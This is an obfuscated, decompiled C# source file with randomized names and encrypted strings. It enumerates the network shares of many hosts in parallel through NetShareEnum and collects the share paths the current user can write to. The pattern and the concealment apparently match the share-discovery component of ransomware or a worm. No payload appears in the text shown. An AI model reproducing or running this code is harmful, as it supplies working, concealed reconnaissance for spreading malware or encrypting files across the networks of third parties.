using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace DFgOqDzZpZe;

internal sealed class TePlVGhXunPu
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct qPdxKdEavR
	{
		public string rezOmEJWVmsYL;

		public uint tviPgtAzHxkLsz;

		public string UhFibCThtYrVD;

		public qPdxKdEavR(string string_0, uint uint_0, string string_1)
		{
			rezOmEJWVmsYL = string_0;
			tviPgtAzHxkLsz = uint_0;
			UhFibCThtYrVD = string_1;
		}

		public override string ToString()
		{
			return rezOmEJWVmsYL;
		}
	}

	private sealed class ZeoIXlyuXBYha
	{
		public mgfLHdPEFNpYee.iIzVwqDPrWThf HRMIBcIuGxOLy;
	}

	private sealed class ZRraKGrcwZ
	{
		public ZeoIXlyuXBYha kFuonrkFaMxXF;

		public string MSyWLauGcw;

		public void _003CGetAllShares_003Eb__1()
		{
			yQqXswWRCzAmwG(MSyWLauGcw, kFuonrkFaMxXF.HRMIBcIuGxOLy);
		}
	}

	public static ReaderWriterLockSlim IjNcfQJcsyqugng;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static qPdxKdEavR[] IoGpunegtPw(string string_0)
	{
		List<qPdxKdEavR> list = new List<qPdxKdEavR>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(qPdxKdEavR));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				qPdxKdEavR item = (qPdxKdEavR)Marshal.PtrToStructure(ptr, typeof(qPdxKdEavR));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new qPdxKdEavR(getString_0(107398821) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	public static void yQqXswWRCzAmwG(string string_0, mgfLHdPEFNpYee.iIzVwqDPrWThf iIzVwqDPrWThf_0)
	{
		string[] source = new string[2]
		{
			getString_0(107398812),
			getString_0(107398767)
		};
		qPdxKdEavR[] array = IoGpunegtPw(string_0);
		if (array.Length > 0)
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>();
			List<string> list3 = new List<string>();
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			string value = current.User!.Value;
			qPdxKdEavR[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				qPdxKdEavR qPdxKdEavR = array2[i];
				if (iIzVwqDPrWThf_0.HFSgkjkNPzYvbv != null && iIzVwqDPrWThf_0.HFSgkjkNPzYvbv.Contains(qPdxKdEavR.rezOmEJWVmsYL.ToString().ToUpper()))
				{
					continue;
				}
				try
				{
					string text = string.Format(getString_0(107398786), string_0, qPdxKdEavR.rezOmEJWVmsYL);
					Directory.GetFiles(text);
					list.Add(qPdxKdEavR.rezOmEJWVmsYL);
					AuthorizationRuleCollection accessRules = Directory.GetAccessControl(text).GetAccessRules(includeExplicit: true, includeInherited: true, typeof(SecurityIdentifier));
					foreach (FileSystemAccessRule item in accessRules)
					{
						if ((item.IdentityReference.ToString() == value || current.Groups!.Contains(item.IdentityReference)) && item.FileSystemRights.HasFlag(FileSystemRights.Write) && item.AccessControlType == AccessControlType.Allow)
						{
							if (!thNrRmMEuvdxhHm.YyCNsMjoVMOoP.Contains(text))
							{
								thNrRmMEuvdxhHm.YyCNsMjoVMOoP.Add(text);
							}
							list2.Add(qPdxKdEavR.rezOmEJWVmsYL);
							break;
						}
					}
				}
				catch
				{
					if (!source.Contains(qPdxKdEavR.rezOmEJWVmsYL))
					{
						list3.Add(qPdxKdEavR.rezOmEJWVmsYL);
					}
				}
			}
		}
		sbrSNtjCobuVDE.MkzfmEldCSvGbED++;
	}

	public static void qYTIComhfRwZc(List<string> list_0, mgfLHdPEFNpYee.iIzVwqDPrWThf iIzVwqDPrWThf_0)
	{
		ZeoIXlyuXBYha zeoIXlyuXBYha = new ZeoIXlyuXBYha();
		zeoIXlyuXBYha.HRMIBcIuGxOLy = iIzVwqDPrWThf_0;
		List<Action> list = new List<Action>();
		using (List<string>.Enumerator enumerator = list_0.GetEnumerator())
		{
			while (enumerator.MoveNext())
			{
				Action action = null;
				ZRraKGrcwZ CS_0024_003C_003E8__locals0 = new ZRraKGrcwZ();
				CS_0024_003C_003E8__locals0.kFuonrkFaMxXF = zeoIXlyuXBYha;
				CS_0024_003C_003E8__locals0.MSyWLauGcw = enumerator.Current;
				action = delegate
				{
					yQqXswWRCzAmwG(CS_0024_003C_003E8__locals0.MSyWLauGcw, CS_0024_003C_003E8__locals0.kFuonrkFaMxXF.HRMIBcIuGxOLy);
				};
				list.Add(action);
			}
		}
		ParallelOptions parallelOptions = new ParallelOptions();
		parallelOptions.MaxDegreeOfParallelism = zeoIXlyuXBYha.HRMIBcIuGxOLy.ZKumpgvgOVOtdZ;
		ParallelOptions parallelOptions2 = parallelOptions;
		Parallel.Invoke(parallelOptions2, list.ToArray());
	}

	static TePlVGhXunPu()
	{
		Strings.CreateGetStringDelegate(typeof(TePlVGhXunPu));
		IjNcfQJcsyqugng = new ReaderWriterLockSlim();
	}
}
